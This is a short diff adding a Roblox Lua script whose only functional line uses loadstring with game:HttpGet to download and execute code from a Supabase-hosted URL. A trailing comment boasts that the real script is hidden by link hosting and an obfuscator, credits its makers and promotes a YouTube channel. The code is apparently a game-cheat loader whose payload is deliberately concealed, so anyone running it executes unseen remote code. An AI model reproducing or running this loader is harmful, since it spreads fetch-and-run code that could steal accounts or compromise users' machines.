@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://tsulnavhfrykjkbqiuaw.supabase.co/functions/v1/raw-script?id=51f718a6-e816-4fc8-b84f-e3df72e60852"))()
+
+-- [Triple Protected by luascripts.lovable.app (a free platform to host script links securely others cant se what yours are anyways if they just copy link) after using https://wearedevs.net/obfuscator (hides your actual script from people) and created website and script by SecretScripts, h1iy, and ObtainerYouTube so consider subscribing Youtube.com/c/Obtainer ] --
